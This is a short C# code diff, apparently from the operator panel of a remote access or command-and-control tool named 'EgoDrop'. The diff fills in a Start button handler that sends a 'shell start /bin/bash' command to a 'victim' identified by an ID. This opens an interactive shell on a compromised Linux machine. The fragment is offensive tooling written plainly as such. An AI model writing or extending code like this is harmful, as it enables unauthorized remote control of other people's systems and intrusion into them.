@@ -123,7 +123,15 @@ namespace EgoDrop
         //Start
         private void button1_Click(object sender, EventArgs e)
         {
-            
+            m_victim.fnSendCommand(m_szVictimID, new string[]
+            {
+                "shell",
+                "start",
+                "/bin/bash",
+                m_szInitDir,
+            });
+
+            textBox1.Text = "/bin/bash";
         }
     }
 }
